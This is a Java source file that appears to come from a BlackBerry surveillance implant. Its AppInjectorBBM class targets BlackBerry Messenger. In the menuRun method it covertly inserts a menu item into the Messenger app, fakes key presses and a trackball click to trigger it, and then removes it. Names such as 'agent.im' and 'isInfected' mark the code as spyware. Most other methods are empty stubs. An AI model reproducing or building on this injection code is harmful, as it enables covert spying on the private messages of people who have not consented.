package blackberry.injection;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.im.BBMMenuItem;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

class AppInjectorBBM implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
    //#endif
    
    private static AppInjectorBBM instance;
    private static final long GUID = 0xcb37fa94a62baf5dL;

    public static synchronized AppInjectorBBM getInstance() {
        if (instance == null) {
            instance = (AppInjectorBBM) RuntimeStore.getRuntimeStore()
                    .get(GUID);
            if (instance == null) {
                final AppInjectorBBM singleton = new AppInjectorBBM();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    BBMMenuItem menu = BBMMenuItem.getInstance();

    public boolean requestForeground() {
        // TODO Auto-generated method stub
        return false;
    }

    public boolean injectMenu() {
        // TODO Auto-generated method stub
        return false;
    }

    public boolean callMenuByKey() {
        // TODO Auto-generated method stub
        return false;
    }

    public boolean deleteMenu() {
        // TODO Auto-generated method stub
        return false;
    }

    public boolean menuRun() {
        menu.addMenuBBM();

        Utils.sleep(100);
        KeyInjector.pressKey(Keypad.KEY_MENU);
        Utils.sleep(100);

        debug.trace("  messenger active screen: "
                + UiApplication.getUiApplication().getActiveScreen().getClass()
                        .getName());

        KeyInjector.pressRawKey('y');

        Utils.sleep(100);
        debug.info("pressing menu y");
        KeyInjector.trackBallClick();

        Utils.sleep(100);
        menu.removeMenuBBM();

        return false;
    }

    public String getAppName() {

        return "Messenger";
    }


    public void callMenuInContext() {
        // TODO Auto-generated method stub
        
    }

    public boolean isInfected() {
        // TODO Auto-generated method stub
        return false;
    }

}
